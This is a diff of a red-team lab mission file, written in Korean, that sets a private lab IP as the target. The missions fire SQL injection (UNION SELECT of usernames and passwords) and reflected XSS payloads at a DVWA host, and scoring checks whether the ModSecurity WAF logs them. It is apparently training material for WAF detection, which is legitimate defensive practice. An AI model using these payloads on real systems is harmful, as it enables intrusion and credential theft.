@@ -45,11 +45,11 @@ red_missions:
       ```bash
       for i in $(seq 1 8); do
         curl -s -A "sqlmap/1.7" -H "Host: dvwa.6v6.lab" \
-          "http://<대상_공개IP>/vulnerabilities/sqli/?id=sa02r1-kim-$i%27%20UNION%20SELECT%20user,password%20FROM%20users--+&Submit=Submit"
+          "http://192.168.0.161/vulnerabilities/sqli/?id=sa02r1-kim-$i%27%20UNION%20SELECT%20user,password%20FROM%20users--+&Submit=Submit"
         sleep 5
       done
       ```
-      `<대상_공개IP>` = solo 면 본인, duel 이면 상대 인프라 IP.
+      `192.168.0.161` = solo 면 본인, duel 이면 상대 인프라 IP.
 
       ### 채점 방법
       대상 WAF audit(modsec)에 **태그 `sa02r1` 가 포함된 SQLi 탐지(942 계열)** 가 (반복적으로) 남았는지로 채점.
@@ -90,7 +90,7 @@ red_missions:
       ```bash
       for i in $(seq 1 5); do
         curl -s -H "Host: dvwa.6v6.lab" \
-          "http://<대상_공개IP>/vulnerabilities/xss_r/?name=sa02r2-kim-$i<script>alert(1)</script>"
+          "http://192.168.0.161/vulnerabilities/xss_r/?name=sa02r2-kim-$i<script>alert(1)</script>"
         sleep 5
       done
       ```
